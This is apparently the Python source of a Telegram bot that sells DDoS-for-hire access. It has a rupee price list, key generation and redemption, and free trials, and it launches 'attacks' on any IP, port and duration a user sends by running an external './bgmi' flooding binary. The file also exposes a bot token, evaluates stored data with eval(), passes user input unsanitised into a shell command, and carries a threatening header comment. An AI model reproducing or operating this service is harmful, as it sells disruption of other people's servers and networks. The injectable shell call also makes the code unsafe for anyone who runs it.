import os #Owner @DarkNet_AJ Kuchh Bhi Chenge Kiya To Pakka Error Aayega Aur Phone Hack Ho Jayega 
import telebot
import asyncio
import logging
import random
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

loop = asyncio.get_event_loop()
TOKEN = '7834211332:AAEWehgWzZJY1Z2DgMiEi7Ixv97M6Obwk9k'
bot = telebot.TeleBot(TOKEN)
OWNER_IDS = [7468235894, 6404882101, 6902791681]

KEYS_FILE = 'keys.txt'
USED_KEYS_FILE = 'used_keys.txt'
TRIAL_USERS_FILE = 'trial_users.txt'
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []

VALID_DURATIONS = {
    "1 hour": (10, 1/24),
    "2 hour": (20, 2/24),
    "3 hour": (30, 3/24),
    "4 hour": (40, 4/24),
    "5 hour": (50, 5/24),
    "1 day": (99, 1),
    "2 days": (149, 2),
    "3 days": (199, 3),
    "4 days": (249, 4),
    "5 days": (299, 5),
    "6 days": (349, 6),
    "7 days": (399, 7),
    "30 days": (999, 30)
}

async def run_attack_command_on_codespace(ip, port, duration):
    command = f"./bgmi {ip} {port} {duration} 1300"
    try:
        process = await asyncio.create_subprocess_shell(command)
        running_processes.append(process)
        await process.communicate()
    except Exception as e:
        logging.error(f"Attack error: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)

def is_user_approved(user_id):
    if user_id in OWNER_IDS:
        return True
    if not os.path.exists(USED_KEYS_FILE):
        return False
    with open(USED_KEYS_FILE, 'r') as file:
        for line in file:
            data = eval(line.strip())
            if data['user_id'] == user_id:
                if datetime.now() <= datetime.fromisoformat(data['valid_until']):
                    return True
    return False

def send_price_list(chat_id):
    msg = (
        "*PRICE LIST*👇\n"
        "⏳1 HOUR = ₹10 ✅\n"
        "⏳2 HOUR = ₹20 ✅\n"
        "⏳3 HOUR = ₹30 ✅\n"
        "⏳4 HOUR = ₹40 ✅\n"
        "⏳5 HOUR = ₹50 ✅\n"
        "⏳1 DAY = ₹99 ✅\n"
        "⏳2 DAYS = ₹149 ✅\n"
        "⏳3 DAYS = ₹199 ✅\n"
        "⏳4 DAYS = ₹249 ✅\n"
        "⏳5 DAYS = ₹299 ✅\n"
        "⏳6 DAYS = ₹349 ✅\n"
        "⏳7 DAYS = ₹399 ✅\n"
        "⏳30 DAYS = ₹999 ✅\n\n"
        "*BUY DM 👉 @Darknetdon1*"
    )
    bot.send_message(chat_id, msg, parse_mode='Markdown')

@bot.message_handler(commands=['key'])
def handle_key_generation(message):
    user_id = message.from_user.id
    if user_id not in OWNER_IDS:
        bot.send_message(message.chat.id, "*Only owner can generate keys.*", parse_mode='Markdown')
        return

    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        valid_keys = ', '.join(VALID_DURATIONS.keys())
        bot.send_message(message.chat.id, f"*Use like:* /key 2 hour\n*Valid options:* {valid_keys}", parse_mode='Markdown')
        return

    duration = args[1].lower()
    if duration not in VALID_DURATIONS:
        valid_keys = ', '.join(VALID_DURATIONS.keys())
        bot.send_message(message.chat.id, f"*Invalid duration.* Use one of: {valid_keys}", parse_mode='Markdown')
        return

    price, days = VALID_DURATIONS[duration]
    key = f"{duration.replace(' ', '')}-" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))

    with open(KEYS_FILE, 'a') as f:
        f.write(f"{key}\n")

    bot.send_message(message.chat.id, f"*Key generated for {duration} (₹{price}):* `{key}`", parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    bot.send_message(message.chat.id, "*Send your key to activate access:*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    key = message.text.strip()
    user_id = message.from_user.id

    if not os.path.exists(KEYS_FILE):
        bot.send_message(message.chat.id, "*No keys available.*", parse_mode='Markdown')
        return

    with open(KEYS_FILE, 'r') as file:
        keys = [line.strip() for line in file]

    if key not in keys:
        bot.send_message(message.chat.id, "*Invalid key.*", parse_mode='Markdown')
        return

    with open(KEYS_FILE, 'w') as file:
        for k in keys:
            if k != key:
                file.write(f"{k}\n")

    try:
        duration = key.split('-')[0]
        for valid_key in VALID_DURATIONS:
            if duration in valid_key.replace(" ", ""):
                price, days = VALID_DURATIONS[valid_key]
                break
        else:
            raise ValueError("Invalid duration")

        valid_until = (datetime.now() + timedelta(days=days)).isoformat()

        with open(USED_KEYS_FILE, 'a') as f:
            f.write(f"{{'user_id': {user_id}, 'valid_until': '{valid_until}', 'key': '{key}'}}\n")

        bot.send_message(message.chat.id, f"*Access granted for {valid_key}!*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Redeem error: {e}")
        bot.send_message(message.chat.id, "*Error processing key.*", parse_mode='Markdown')

@bot.message_handler(commands=['trial'])
def trial(message):
    user_id = message.from_user.id
    if user_id in OWNER_IDS:
        bot.send_message(message.chat.id, "*You already have access.*", parse_mode='Markdown')
        return

    if os.path.exists(TRIAL_USERS_FILE):
        with open(TRIAL_USERS_FILE, 'r') as f:
            if str(user_id) in f.read():
                bot.send_message(message.chat.id, "*You have already used your free trial.*", parse_mode='Markdown')
                return

    expiry = (datetime.now() + timedelta(minutes=10)).isoformat()
    with open(USED_KEYS_FILE, 'a') as f:
        f.write(f"{{'user_id': {user_id}, 'valid_until': '{expiry}', 'key': 'trial'}}\n")
    with open(TRIAL_USERS_FILE, 'a') as f:
        f.write(f"{user_id}\n")

    bot.send_message(message.chat.id, "*10-minute trial activated!*", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("🚀 Start Attack"),
               KeyboardButton("✅ My Account"))
    markup.add(KeyboardButton("🔐🔑 Buy Key"),
               KeyboardButton("🚩 Trial"))
    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda m: True)
def handle_menu(message):
    user_id = message.from_user.id
    text = message.text.strip().replace("*", "").replace("🚀", "").replace("✅", "").replace("🔐🔑", "").replace("🚩", "").strip().lower()

    if text == "start attack":
        if not is_user_approved(user_id):
            send_price_list(message.chat.id)
            return
        bot.send_message(message.chat.id, "*Send IP, Port, Time:*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack)

    elif text == "my account":
        if not is_user_approved(user_id):
            send_price_list(message.chat.id)
            return
        expiry = "Unknown"
        with open(USED_KEYS_FILE, 'r') as file:
            for line in file:
                data = eval(line.strip())
                if data['user_id'] == user_id:
                    expiry = data['valid_until']
        bot.send_message(message.chat.id, f"*User ID:* `{user_id}`\n*Valid Until:* `{expiry}`", parse_mode='Markdown')

    elif text == "buy key":
        send_price_list(message.chat.id)

    elif text == "trial":
        trial(message)

    else:
        bot.send_message(message.chat.id, "*Invalid option. Choose from menu.*", parse_mode='Markdown')

def process_attack(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid format. Use: IP PORT TIME*", parse_mode='Markdown')
            return

        ip, port, time = args[0], int(args[1]), args[2]
        if port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {port} is blocked.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(ip, port, time), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥🧨*\n"
                                          f"*User:* {message.from_user.first_name}\n"
                                          f"*Host:* {ip}\n"
                                          f"*Port:* {port}\n"
                                          f"*Time:* {time} seconds\n\n"
                                          f"*Owner 👉 @Darknetdon1*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Attack error: {e}")
        bot.send_message(message.chat.id, "*Error in attack command.*", parse_mode='Markdown')

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == '__main__':
    Thread(target=start_asyncio_thread).start()
    bot.polling(none_stop=True)